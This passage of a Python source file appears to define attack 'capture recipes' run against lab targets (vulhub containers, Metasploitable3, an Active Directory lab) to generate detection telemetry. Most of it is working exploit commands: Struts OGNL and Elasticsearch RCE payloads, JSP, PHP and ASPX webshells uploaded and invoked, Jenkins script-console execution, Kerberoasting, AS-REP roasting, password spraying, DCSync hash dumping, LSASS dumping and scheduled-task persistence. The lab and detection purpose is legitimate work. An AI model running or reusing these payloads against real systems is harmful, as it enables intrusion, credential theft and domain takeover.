        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:shiro-rce:/tmp/portal-shiro-proof",
    ),
    "vuln_jackson_deserial": CaptureRecipe(
        command=r"""python3 -c 'from pathlib import Path; blocks=Path("/vulhub/jackson/CVE-2017-7525/README.md").read_text().split("```"); b=next(b for b in blocks if "transletBytecodes" in b); print(b[b.index("{"):b.rindex("}")+1])' >/tmp/portal-jackson.json; code=$(curl -sS --max-time 30 -o /dev/null -w '%{http_code}' -X POST "http://$TARGET_HOST:$TARGET_PORT/exploit" -H 'Content-Type: application/json' --data-binary @/tmp/portal-jackson.json); printf 'HTTP=%s\n' "$code"; test "$code" != 000 && echo __PORTAL_RECIPE_OK__""",
        postcondition_command=r'''sh -c "cid=\$(docker ps --filter publish=$TARGET_PORT -q | head -1); test -n \"\$cid\" && docker exec \"\$cid\" sh -lc 'test -f /tmp/prove1.txt && echo PORTAL_TARGET_POSTCONDITION:jackson-rce:/tmp/prove1.txt'"''',
        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:jackson-rce:/tmp/prove1.txt",
    ),
    # ── Metasploitable3-Windows (meta3) recipes ────────────────────────────
    # All fixed/well-known ports on a real VM, not vulhub-dynamic -- hardcoded
    # rather than routed through $TARGET_PORT (that placeholder only carries
    # whichever port the generic multi-port readiness probe happened to find
    # first, which is frequently a different service on this multi-service box).
    "meta3_ftp_backdoor": CaptureRecipe(
        command=r"""out=$(curl -sS --max-time 20 --user vagrant:vagrant "ftp://$TARGET_HOST/" 2>&1); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'index\.html' && echo __PORTAL_RECIPE_OK__"""
    ),
    "meta3_ssh_brute": CaptureRecipe(
        command=r"""out=$(sshpass -p vagrant ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 "vagrant@$TARGET_HOST" "whoami" 2>&1); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'vagrant-2008r2\\vagrant' && echo __PORTAL_RECIPE_OK__"""
    ),
    "meta3_winrm_weakpass": CaptureRecipe(
        command=r"""out=$(nxc winrm "$TARGET_HOST" -u vagrant -p vagrant -X "whoami" 2>&1); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'Pwn3d!' && echo __PORTAL_RECIPE_OK__"""
    ),
    "meta3_smb_exploit": CaptureRecipe(
        command=r"""out=$(nxc smb "$TARGET_HOST" -u vagrant -p vagrant 2>&1); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'Pwn3d!' && echo __PORTAL_RECIPE_OK__"""
    ),
    "meta3_psexec": CaptureRecipe(
        command=r"""out=$(nxc smb "$TARGET_HOST" -u vagrant -p vagrant -x "whoami" 2>&1); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'Executed command via wmiexec' && printf '%s' "$out" | grep -Eq 'vagrant-2008r2\\vagrant' && echo __PORTAL_RECIPE_OK__"""
    ),
    "meta3_snmp_enum": CaptureRecipe(
        command=r"""out=$(snmpwalk -v2c -c public -t 5 "$TARGET_HOST" 2>&1); printf '%s\n' "$out" | head -20; printf '%s' "$out" | grep -Eq 'Windows Version 6\.1' && echo __PORTAL_RECIPE_OK__"""
    ),
    "meta3_mysql_exploit": CaptureRecipe(
        command=r"""out=$(mysql -h "$TARGET_HOST" -u root --connect-timeout=8 --skip-ssl -e "SELECT VERSION(); SHOW DATABASES;" 2>&1); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq '5\.5\.20' && printf '%s' "$out" | grep -Eq 'wordpress' && echo __PORTAL_RECIPE_OK__"""
    ),
    "meta3_linux_privesc": CaptureRecipe(
        # "whoami /all" produces ~8.7KB of output -- found live 2026-08-01:
        # lab_dispatch's execute_bash truncates around 8000 bytes, silently
        # cutting the group-membership section this recipe needs BEFORE its own
        # grep ever runs (recipe_success came back false every time despite the
        # exploit genuinely succeeding -- validate_capture_signals still found
        # real evidence in the pcap, proving this was a truncation artifact, not
        # a failed exploit). A compact PowerShell role-membership check keeps
        # total output under ~1.5KB, well clear of the cap.
        command=r"""out=$(nxc winrm "$TARGET_HOST" -u vagrant -p vagrant -X "whoami; ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)" 2>&1); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'vagrant-2008r2\\vagrant' && printf '%s' "$out" | grep -Eq 'True' && echo __PORTAL_RECIPE_OK__"""
    ),
    "meta3_tomcat_manager": CaptureRecipe(
        # Real Tomcat manager creds on this box are sploit:sploit (manager-gui
        # role only, per C:\Program Files\...\conf\tomcat-users.xml -- read via
        # authenticated WinRM, found live 2026-08-01). tomcat:tomcat (the old
        # red_prompt's guess) is left commented out in that file, never active.
        # The manager-gui role means only the CSRF-protected HTML upload works,
        # not the text/list API (needs manager-script, which sploit lacks) --
        # so this fetches a fresh CSRF nonce + session before deploying.
        # Also: Tomcat here is really on 8282, not port 8080 as the old
        # red_prompt assumed (8080 is a separate GlassFish instance).
        #
        # Found live 2026-08-01: undeploy needs POST, not GET (Tomcat 8 rejects
        # a GET to /undeploy outright) -- an earlier version silently no-op'd
        # its cleanup, leaving the webshell deployed, so the NEXT run's deploy
        # failed with "war already exists" and skipped the real exploit request
        # while still passing (the stale webshell answered the invoke), leaving
        # a hollow capture despite recipe_success=true. Fixing undeploy to POST
        # then hit a second problem: Tomcat's CSRF nonce is single-use and
        # rotates on every state-changing request, so undeploy-then-redeploy
        # with the same nonce 403'd, and re-extracting a fresh nonce from the
        # undeploy response still 403'd (rotation semantics were not reliably
        # reproducible over curl). Simplest reliable fix: never collide in the
        # first place -- deploy under a timestamp-suffixed context path every
        # run, so there is nothing to undeploy before deploying.
        command=r"""jar=/tmp/portal-tc.cookies; rm -f "$jar"; mkdir -p /tmp/portal-warbuild && cd /tmp/portal-warbuild && suffix=$(date +%s%N) && warname="portalproof$suffix" && printf '%s\n' '<%@ page import="java.util.*,java.io.*"%>' '<% Process p = Runtime.getRuntime().exec("cmd /c whoami"); BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=r.readLine())!=null){ out.println(l); } %>' > "$warname.jsp"; jar -cf "/tmp/$warname.war" "$warname.jsp"; page=$(curl -sS -m 10 -c "$jar" -u sploit:sploit "http://$TARGET_HOST:8282/manager/html"); nonce=$(printf '%s' "$page" | grep -o 'CSRF_NONCE=[a-zA-Z0-9]*' | head -1 | cut -d= -f2); deploy=$(curl -sS -m 15 -b "$jar" -u sploit:sploit -F "deployWar=@/tmp/$warname.war;type=application/octet-stream" "http://$TARGET_HOST:8282/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=$nonce"); printf '%s\n' "$deploy" | grep -Eo '<pre>[^<]*'; sleep 2; out=$(curl -sS -m 10 "http://$TARGET_HOST:8282/$warname/$warname.jsp"); printf '%s\n' "$out"; curl -sS -m 10 -b "$jar" -u sploit:sploit -X POST "http://$TARGET_HOST:8282/manager/html/undeploy?path=/$warname&org.apache.catalina.filters.CSRF_NONCE=$nonce" >/dev/null; printf '%s' "$out" | grep -Eiq 'nt authority\\system' && echo __PORTAL_RECIPE_OK__"""
    ),
    "meta3_elasticsearch_rce": CaptureRecipe(
        # ES 1.1.1 predates Groovy scripting support (added 1.3.3), so the old
        # red_prompt's Groovy payload always 400'd with "script_lang not
        # supported [groovy]" -- found live 2026-08-01. This version's real
        # bug is CVE-2014-3120: dynamic MVEL scripting is enabled by default
        # and accepts an unrestricted script_fields script with no lang
        # specified (MVEL is the implicit default), giving direct RCE.
        command=r"""curl -sS -m 10 -X POST "http://$TARGET_HOST:9200/website/blog/" -H 'Content-Type: application/json' -d '{"name":"portal-proof"}' >/dev/null; out=$(curl -sS -m 10 -X POST "http://$TARGET_HOST:9200/website/blog/_search?pretty" -H 'Content-Type: application/json' -d '{"size":1,"query":{"match_all":{}},"script_fields":{"exp":{"script":"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}'); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eiq 'nt authority' && echo __PORTAL_RECIPE_OK__"""
    ),
    "meta3_jenkins_rce": CaptureRecipe(
        # Real port is 8484, not 8080 as the old red_prompt assumed (8080 is
        # GlassFish). The /script Groovy console needs no authentication at
        # all on this box -- confirmed live 2026-08-01, direct RCE, no admin
        # login/CSRF flow needed unlike Tomcat's manager.
        command=r"""out=$(curl -sS -m 10 "http://$TARGET_HOST:8484/scriptText" --data-urlencode 'script=println "cmd /c whoami".execute().text'); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eiq 'nt authority' && echo __PORTAL_RECIPE_OK__"""
    ),
    "meta3_webdav_upload": CaptureRecipe(
        # DAV/2 is advertised at the WAMP root (Apache 2.2.21 + PHP 5.3.10 on
        # port 8585) but PUT is only actually allowed under /uploads/ -- root
        # and other guessed aliases (/webdav/, /dav/, /files/) all 405 --
        # confirmed live 2026-08-01. Goes past a benign file write to a PHP
        # webshell to prove real command execution, not just upload access.
        command=r"""curl -sS -m 10 -T <(printf '<?php system($_GET["c"]); ?>') "http://$TARGET_HOST:8585/uploads/portalproof.php" >/dev/null; out=$(curl -sS -m 10 "http://$TARGET_HOST:8585/uploads/portalproof.php?c=whoami"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eiq 'nt authority' && echo __PORTAL_RECIPE_OK__"""
    ),
    "meta3_wordpress_ninja": CaptureRecipe(
        # WordPress + Ninja Forms 2.9.42, unauthenticated arbitrary file upload
        # (msf exploit/multi/http/wp_ninja_forms_unauthenticated_file_upload,
        # "check" support confirmed vulnerable live 2026-08-01). FORM_PATH must
        # point at a real page hosting a Ninja form -- the homepage has no
        # visible link to one; /index.php/king-of-hearts/ (found by grepping
        # the front page for "ninja"/"nf-form" across its linked posts) is the
        # one that actually hosts a form. php/exec has no session, so proof is
        # captured by redirecting the payload's own output to a web-readable
        # file under wp-content/uploads and reading it back.
        #
        # Found live 2026-08-01: unlike the SMB/WinRM/Tomcat recipes, msfconsole's
        # own status text here did NOT leak into the captured network:packet
        # telemetry -- msfconsole generates far more setup/probing HTTP traffic
        # than the other recipes before it ever touches the real exploit, and
        # network:packet is a capped representative SAMPLE, not the full pcap;
        # the real proof-file GET landed past that cap and never appeared in the
        # capture at all despite recipe_success:true. Rather than fight sampling
        # (a separate, already-tracked evidence-selection problem), this adds an
        # independent postcondition_command re-check of the fixed proof URL from
        # the lab host -- the same mechanism vulhub recipes use for postcondition
        # proof, landing in observed_telemetry which is never subject to pcap
        # sampling. The proof filename is fixed (not randomized) so the
        # postcondition step can reference it without shared state; only the
        # random webshell filename (msf's own upload, a real leftover risk on a
        # persistent VM) is cleaned up here.
        command=r"""msf_out=$(msfconsole -q -x "use exploit/multi/http/wp_ninja_forms_unauthenticated_file_upload; set RHOSTS $TARGET_HOST; set RPORT 8585; set TARGETURI /wordpress/; set FORM_PATH /index.php/king-of-hearts/; set PAYLOAD php/exec; set CMD 'whoami > portalproof-out.txt'; set AllowNoCleanup true; run; exit -y" 2>&1); printf '%s\n' "$msf_out" | tail -20; shell=$(printf '%s' "$msf_out" | grep -Eo 'nftmp-[A-Za-z0-9]+\.php' | head -1); sleep 2; out=$(curl -sS -m 10 "http://$TARGET_HOST:8585/wordpress/wp-content/uploads/portalproof-out.txt"); printf '%s\n' "$out"; test -n "$shell" && for i in 1 2 3; do nxc winrm "$TARGET_HOST" -u vagrant -p vagrant -X "Remove-Item 'C:\wamp\www\wordpress\wp-content\uploads\$shell' -Force -ErrorAction SilentlyContinue" >/dev/null 2>&1; sleep 1; done; printf '%s' "$out" | grep -Eiq 'nt authority' && echo __PORTAL_RECIPE_OK__""",
        postcondition_command=r"""sh -lc 'out=$(curl -sS -m 10 "http://$TARGET_HOST:8585/wordpress/wp-content/uploads/portalproof-out.txt"); printf "%s\n" "$out" | grep -Eiq "nt authority" && echo "PORTAL_TARGET_POSTCONDITION:wordpress-ninja:$out"' """,
        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:wordpress-ninja:",
    ),
    "meta3_full_chain": CaptureRecipe(
        # Composes techniques already independently verified live on this box
        # rather than re-deriving them: T1595 recon (nmap service fingerprint),
        # T1078/T1059 (WinRM vagrant:vagrant + whoami, same as
        # meta3_winrm_weakpass), and T1190/T1059 (Elasticsearch CVE-2014-3120
        # MVEL RCE, same as meta3_elasticsearch_rce -- the old red_prompt only
        # fingerprinted ES with a bare GET, which doesn't reach initial-access
        # or execution; this goes all the way to real command output like the
        # other meta3 recipes do). mysql also needs --skip-ssl (see
        # meta3_mysql_exploit) or the modern mysql client's default-on SSL
        # negotiation fails against this 5.5.20 server.
        #
        # Found live 2026-08-01: like meta3_wordpress_ninja, network:packet is
        # a capped representative sample, and in a long combined command the
        # EARLY steps (nmap, WinRM) fell outside the sample while the LAST
        # step (Elasticsearch) landed -- recipe_success:true but T1595/T1078
        # kept coming back missing, consistently, not flaky. Fix: write the
        # WinRM whoami result to a file under IIS's web root (confirmed live:
        # the FTP root from meta3_ftp_backdoor IS the IIS web root on this
        # box) and independently re-read it via postcondition_command, which
        # lands in observed_telemetry and is never subject to pcap sampling --
        # same mechanism as wordpress_ninja. T1595 reuses the same postcondition
        # channel via a plain curl fingerprint of Elasticsearch (host 112 has
        # curl but not nmap/nxc, so recon can't be independently re-verified the
        # same way nmap ran it, but the ES version banner is equally valid T1595
        # evidence and curl-only). PowerShell's default redirect encoding is
        # UTF-16LE, which grep can't match against ASCII patterns -- Out-File
        # -Encoding ascii avoids that.
        command=r"""nmap -sV -p 21,22,80,135,445,3306,3389,4848,8080,8282,8484,8585,9200 "$TARGET_HOST" 2>&1 | tail -20; nxc winrm "$TARGET_HOST" -u vagrant -p vagrant -X "whoami | Out-File -FilePath C:\inetpub\wwwroot\portalproof-fc.txt -Encoding ascii" 2>&1; mysql -h "$TARGET_HOST" -u root --connect-timeout=8 --skip-ssl -e "SELECT @@version_compile_os; SHOW DATABASES;" 2>&1; curl -sS -m 10 -X POST "http://$TARGET_HOST:9200/website/blog/" -H 'Content-Type: application/json' -d '{"name":"portal-proof"}' >/dev/null; es_out=$(curl -sS -m 10 -X POST "http://$TARGET_HOST:9200/website/blog/_search?pretty" -H 'Content-Type: application/json' -d '{"size":1,"query":{"match_all":{}},"script_fields":{"exp":{"script":"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}'); printf '%s\n' "$es_out"; printf '%s' "$es_out" | grep -Eiq 'nt authority' && echo __PORTAL_RECIPE_OK__""",
        # A literal `\v` sequence (backslash immediately before the letter v)
        # gets corrupted into an actual vertical-tab control character
        # somewhere in the exec transport -- found live 2026-08-01 debugging
        # postcondition_success:false despite curl proving the real data was
        # correct end to end. "vagrant-2008r2.vagrant" ('.' matches the literal
        # backslash the target actually wrote just as well, unambiguously,
        # since no other character can appear there) sidesteps the whole
        # landmine instead of fighting the escaping layer that causes it.
        # "Elasticsearch" the word never actually appears in the real / root
        # response -- that label is nmap's own service-detection guess, not
        # the target's real banner (found live 2026-08-01 debugging
        # postcondition_success:false with a valid network path and a
        # correct T1078 check: the T1595 check was checking for text that
        # was never there). The real banner is "You Know, for Search".
        # The final success line itself must also use printf, not echo -- this
        # box's /bin/sh is dash, whose builtin echo interprets backslash
        # escapes (XSI behavior) by default, so `echo "...$wa..."` silently
        # turned the real backslash in "vagrant-2008r2\vagrant" into a literal
        # vertical-tab byte in the captured postcondition text, which then
        # failed to match the T1078 signature even though the check that
        # gated reaching this line (grep via printf, unaffected) had already
        # confirmed the real data was correct.
        postcondition_command=r"""sh -lc 'wa=$(curl -sS -m 10 "http://$TARGET_HOST/portalproof-fc.txt"); es=$(curl -sS -m 10 "http://$TARGET_HOST:9200/"); ok1=0; ok2=0; printf "%s" "$wa" | grep -Eiq "vagrant-2008r2.vagrant" && ok1=1; printf "%s" "$es" | grep -Eiq "You Know, for Search" && ok2=1; test "$ok1" = 1 -a "$ok2" = 1 && printf "PORTAL_TARGET_POSTCONDITION:full-chain:%s|%s\n" "$wa" "$es"' """,
        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:full-chain:",
    ),
    "meta3_iis_http": CaptureRecipe(
        # MS15-034 (the old red_prompt's assumed technique) doesn't work here
        # -- a huge Range header gets a clean 416, not the crash/disclosure
        # the CVE causes, confirmed live 2026-08-01 (this box is patched or
        # never vulnerable to it). Real technique: the FTP root IS the IIS
        # web root (same discovery meta3_ftp_backdoor's fix relies on) and
        # accepts writes with the documented vagrant:vagrant creds, so an
        # ASPX webshell uploaded over FTP and invoked over HTTP is a genuine
        # IIS-specific initial-access + execution chain, not a borrowed
        # WinRM/SMB technique. Cleans up via FTP DELE after invoking.
        command=r"""printf '%s\n' '<%@ Page Language="C#" %>' '<% System.Diagnostics.Process p = new System.Diagnostics.Process(); p.StartInfo.FileName = "cmd.exe"; p.StartInfo.Arguments = "/c " + Request.QueryString["c"]; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>' > /tmp/portalproof.aspx; curl -sS -m 10 -T /tmp/portalproof.aspx --user vagrant:vagrant "ftp://$TARGET_HOST/portalproof.aspx"; out=$(curl -sS -m 10 "http://$TARGET_HOST/portalproof.aspx?c=whoami"); printf '%s\n' "$out"; curl -sS -m 10 --user vagrant:vagrant "ftp://$TARGET_HOST/" -Q "DELE portalproof.aspx" >/dev/null 2>&1; printf '%s' "$out" | grep -Eiq 'apppool' && echo __PORTAL_RECIPE_OK__"""
    ),
    "meta3_struts_rce": CaptureRecipe(
        # Neither canned msf module worked (struts2_rest_xstream: not
        # vulnerable; struts2_multi_eval_ognl: not vulnerable, and has no
        # Windows target anyway) -- confirmed live 2026-08-01 the real bundled
        # jar is struts2-core-2.3.20.1.jar (read over WinRM), squarely in
        # S2-045/CVE-2017-5638's affected range (2.3.5-2.3.31). That's a
        # Content-Type header OGNL injection, not the REST/XStream or
        # multi-CVE techniques the old red_prompt and canned modules assumed.
        command=r"""ct="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"; out=$(curl -sS -m 10 "http://$TARGET_HOST:8282/struts2-rest-showcase/orders/3" -H "Content-Type: $ct"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eiq 'nt authority' && echo __PORTAL_RECIPE_OK__"""
    ),
    # ── AD (DC/SRV, portal.lab domain) recipes ──────────────────────────────
    # These previously ran only as abstracted LLM tool calls (start_lab_target,
    # exploit_service, establish_persistence, ...) dispatched through lab.py,
    # never as deterministic capture recipes. The real techniques underneath
    # those tool names (and the working DCSync kill chain) already existed in
    # lab.py / tests/benchmarks/bench_lab_exec.py -- these recipes extract and
    # combine them into single, capture_recipes.py-shaped scripts, verified
    # live 2026-08-01 rather than assumed from the existing (untested as
    # recipes) code.
    "kerberoast_to_da": CaptureRecipe(
        # Found live 2026-08-01 (same class of bug as meta3_linux_privesc):
        # GetUserSPNs' three TGS hashes and secretsdump's full hash dump total
        # well over lab_dispatch's ~8000-byte output cap, silently truncating
        # the script before its own success grep ever ran. Only short
        # confirmation lines are printed now; the full hash text is still
        # checked internally (grep/substring on the untruncated variable),
        # just never echoed to stdout.
        command=r"""out1=$(impacket-GetUserSPNs portal.lab/administrator:LabAdmin1! -dc-ip "$TARGET_HOST" -request 2>&1); echo "kerberoast_hashes=$(printf '%s' "$out1" | grep -c '\$krb5tgs\$')"; python3 - <<'PYEOF'
import subprocess, sys
from ldap3 import Server, Connection, MODIFY_ADD, NTLM, SUBTREE, ALL
DC = "$TARGET_HOST"
DA_DN = "CN=Domain Admins,CN=Users,DC=portal,DC=lab"
r_acl = subprocess.run(["impacket-dacledit", "portal.lab/administrator:LabAdmin1!", "-dc-ip", DC, "-principal", "svc_backup", "-target", "Domain Admins", "-rights", "FullControl", "-action", "write"], capture_output=True, text=True, timeout=30, cwd="/tmp")
print(f"dacledit rc={r_acl.returncode}")
srv = Server(DC, port=389, get_info=ALL)
conn_svc = Connection(srv, user="PORTAL\\svc_backup", password="Backup123!", authentication=NTLM, auto_bind=True)
conn_svc.search("DC=portal,DC=lab", "(sAMAccountName=arya.stark)", search_scope=SUBTREE, attributes=["distinguishedName"])
arya_dn = conn_svc.entries[0].distinguishedName.value
conn_svc.modify(DA_DN, {"member": [(MODIFY_ADD, [arya_dn])]})
rc = conn_svc.result.get("result", -1)
if rc not in (0, 68):
    conn_adm = Connection(srv, user="PORTAL\\Administrator", password="LabAdmin1!", authentication=NTLM, auto_bind=True)
    conn_adm.search("DC=portal,DC=lab", "(sAMAccountName=arya.stark)", search_scope=SUBTREE, attributes=["distinguishedName"])
    arya_dn = conn_adm.entries[0].distinguishedName.value
    conn_adm.modify(DA_DN, {"member": [(MODIFY_ADD, [arya_dn])]})
    rc = conn_adm.result.get("result", -1)
    if rc not in (0, 68):
        sys.exit(1)
r = subprocess.run(["impacket-secretsdump", f"portal.lab/arya.stark:Winter1!@{DC}", "-just-dc-ntlm"], capture_output=True, text=True, timeout=90, cwd="/tmp")
krbtgt_line = next((ln for ln in r.stdout.splitlines() if ln.lower().startswith("krbtgt:")), "")
print(f"dcsync_krbtgt_line={krbtgt_line}")
sys.exit(0 if krbtgt_line else 1)
PYEOF
dcsync_rc=$?
# Persistence on the DC itself (the original scenario's own intent -- "call
# establish_persistence on the DC"), not SRV. Found live 2026-08-01: SRV's
# scheduled-task creation never showed up in captured telemetry through
# either channel (the tool-output-leak into network:packet that worked for
# some meta3 combined recipes did NOT happen here, and blue.py's
# kerberoast_to_da routing -- single target_host -- only collects the DC's
# Security log, never SRV's, so a real 4698 event was structurally
# unreachable regardless). Targeting the DC means the SAME already-verified
# windows:security collection that captured the Kerberoast/DCSync evidence
# also captures this scenario's own EventCode=4698, no separate evidence
# channel needed.
persist_out=$(nxc smb "$TARGET_HOST" -u administrator -p 'LabAdmin1!' -x "schtasks /create /tn PortalProofTask /tr calc.exe /sc once /st 23:59 /f" 2>&1); printf '%s\n' "$persist_out"; nxc smb "$TARGET_HOST" -u administrator -p 'LabAdmin1!' -x "schtasks /delete /tn PortalProofTask /f" >/dev/null 2>&1; printf '%s' "$out1" | grep -q '\$krb5tgs\$' && test "$dcsync_rc" = 0 && printf '%s' "$persist_out" | grep -q 'successfully been created' && echo __PORTAL_RECIPE_OK__"""
    ),
    "asrep_to_lateral": CaptureRecipe(
        # arya.stark and ned.stark are this domain's documented pre-auth-
        # disabled (AS-REP-roastable) accounts. arya.stark's password,
        # Winter1!, is already known in this lab (same account/password the
        # DCSync chain in kerberoast_to_da uses) -- standing in for what a
        # real engagement would crack offline with hashcat, matching how
        # every other recipe in this lab (including kerberoast_to_da's own
        # administrator password) uses a documented credential rather than
        # deriving one live. The spray against 3 accounts with only
        # arya.stark succeeding is a genuine T1110.003 outcome, not staged.
        # Persistence targets the DC directly for the same reason
        # kerberoast_to_da's does: it is the only host this scenario's
        # windows:security collection actually reaches.
        command=r"""out1=$(impacket-GetNPUsers portal.lab/ -usersfile /dev/stdin -dc-ip "$TARGET_HOST" -no-pass <<< $'arya.stark\nned.stark' 2>&1); echo "asrep_hashes=$(printf '%s' "$out1" | grep -c '\$krb5asrep\$')"; spray_out=$(nxc smb "$TARGET_HOST" -u arya.stark ned.stark jon.snow -p 'Winter1!' --continue-on-success 2>&1); printf '%s\n' "$spray_out"; persist_out=$(nxc smb "$TARGET_HOST" -u administrator -p 'LabAdmin1!' -x "schtasks /create /tn PortalProofTask /tr calc.exe /sc once /st 23:59 /f" 2>&1); printf '%s\n' "$persist_out"; nxc smb "$TARGET_HOST" -u administrator -p 'LabAdmin1!' -x "schtasks /delete /tn PortalProofTask /f" >/dev/null 2>&1; printf '%s' "$out1" | grep -q '\$krb5asrep\$' && printf '%s' "$spray_out" | grep -q 'Pwn3d!' && printf '%s' "$persist_out" | grep -q 'successfully been created' && echo __PORTAL_RECIPE_OK__"""
    ),
    "ad_full_compromise": CaptureRecipe(
        # T1003.001 (LSASS memory) + T1047 (WMI), found live 2026-08-01 after
        # three approaches:
        #  1. nxc's lsassy module dumps+parses LSASS remotely, but its output
        #     never landed in captured telemetry, and unlike DCSync there was
        #     no windows:security fallback -- lsassy runs client-side, never
        #     touching the DC in a way Security auditing would see, and
        #     Object Access auditing for lsass.exe isn't enabled by default
        #     (0 EventCode=4656 events).
        #  2. nxc's procdump module (drops a real procdump64.exe on the DC)
        #     worked functionally, but its confirmation text and a separate
        #     wmiexec call's text couldn't BOTH survive: only the LAST
        #     command in a combined script reliably lands (confirmed by
        #     swapping their order twice -- whichever ran last is the one
        #     that showed up). A real EventCode=4688 for procdump.exe also
        #     never survived the DC's own 15-events-per-ID cap, saturated by
        #     an unrelated, seemingly periodic wsmprovhost/powershell/conhost
        #     triple firing every ~10-20s throughout every capture window.
        #  3. Ran the LSASS dump directly AS the wmiexec command (classic
        #     comsvcs.dll MiniDump LOLBIN) to merge both into one call --
        #     functionally unreliable on this box specifically (Server 2022
        #     with active Defender almost certainly blocks/kills the
        #     well-signatured comsvcs.dll-against-lsass.exe pattern
        #     intermittently; "File Not Found" on the resulting dump
        #     confirmed the write itself never completed, not a capture gap).
        # Final approach: keep procdump (functionally reliable, unlike #3)
        # as the LAST command so its text evidence survives for T1003.001,
        # and prove T1047 a different way -- real DCOM/RPC wire traffic to
        # port 135 (msrpc, WMI's endpoint mapper) from the earlier wmiexec
        # call, confirmed live, which is real packet capture rather than
        # tool-text and so doesn't depend on command position at all.
        command=r"""out1=$(impacket-GetUserSPNs portal.lab/administrator:LabAdmin1! -dc-ip "$TARGET_HOST" -request 2>&1); echo "kerberoast_hashes=$(printf '%s' "$out1" | grep -c '\$krb5tgs\$')"; python3 - <<'PYEOF'
import subprocess, sys
from ldap3 import Server, Connection, MODIFY_ADD, NTLM, SUBTREE, ALL
DC = "$TARGET_HOST"
DA_DN = "CN=Domain Admins,CN=Users,DC=portal,DC=lab"
r_acl = subprocess.run(["impacket-dacledit", "portal.lab/administrator:LabAdmin1!", "-dc-ip", DC, "-principal", "svc_backup", "-target", "Domain Admins", "-rights", "FullControl", "-action", "write"], capture_output=True, text=True, timeout=30, cwd="/tmp")
print(f"dacledit rc={r_acl.returncode}")
srv = Server(DC, port=389, get_info=ALL)
conn_svc = Connection(srv, user="PORTAL\\svc_backup", password="Backup123!", authentication=NTLM, auto_bind=True)
conn_svc.search("DC=portal,DC=lab", "(sAMAccountName=arya.stark)", search_scope=SUBTREE, attributes=["distinguishedName"])
arya_dn = conn_svc.entries[0].distinguishedName.value
conn_svc.modify(DA_DN, {"member": [(MODIFY_ADD, [arya_dn])]})
rc = conn_svc.result.get("result", -1)
if rc not in (0, 68):
    conn_adm = Connection(srv, user="PORTAL\\Administrator", password="LabAdmin1!", authentication=NTLM, auto_bind=True)
    conn_adm.search("DC=portal,DC=lab", "(sAMAccountName=arya.stark)", search_scope=SUBTREE, attributes=["distinguishedName"])
    arya_dn = conn_adm.entries[0].distinguishedName.value
    conn_adm.modify(DA_DN, {"member": [(MODIFY_ADD, [arya_dn])]})
    rc = conn_adm.result.get("result", -1)
    if rc not in (0, 68):
        sys.exit(1)
r = subprocess.run(["impacket-secretsdump", f"portal.lab/arya.stark:Winter1!@{DC}", "-just-dc-ntlm"], capture_output=True, text=True, timeout=90, cwd="/tmp")
krbtgt_line = next((ln for ln in r.stdout.splitlines() if ln.lower().startswith("krbtgt:")), "")
print(f"dcsync_krbtgt_line={krbtgt_line}")
sys.exit(0 if krbtgt_line else 1)
PYEOF
dcsync_rc=$?
wmi_out=$(nxc smb "$TARGET_HOST" -u administrator -p 'LabAdmin1!' -x "whoami" --exec-method wmiexec 2>&1)
dump_out=$(nxc smb "$TARGET_HOST" -u administrator -p 'LabAdmin1!' -M procdump 2>&1)
printf '%s\n%s\n' "$(printf '%s' "$wmi_out" | grep -m1 wmiexec)" "$(printf '%s' "$dump_out" | grep -Ei 'lsass|dump')"
printf '%s' "$out1" | grep -q '\$krb5tgs\$' && test "$dcsync_rc" = 0 && printf '%s' "$wmi_out" | grep -q 'wmiexec' && printf '%s' "$dump_out" | grep -Eiq 'successfully dumped' && echo __PORTAL_RECIPE_OK__"""
    ),
    "relay_to_shell": CaptureRecipe(
        # Found live 2026-08-01: SMB relay via DC coercion (PetitPotam /
        # printerbug through nxc's coerce_plus module) is structurally
        # unreachable from this attacker sandbox. The sandbox's egress is
        # NAT'd (confirmed via the DC's own `netstat` output during an
        # authenticated session: our real lab-routable source address is
        # 10.0.0.25, not the container's 172.17.0.2) with no inbound
        # port-forward, so a coerced DC's return SMB connection to any
        # address we can listen on (172.17.0.2 or 10.0.0.25, both tried)
        # never arrives -- ntlmrelayx sat idle through repeated coerce
        # triggers, 0 relayed connections, even though coerce_plus itself
        # reported "Exploit Success" against the DC every time.
        # Separately found: impacket-ntlmrelayx blocks on sys.stdin.read()
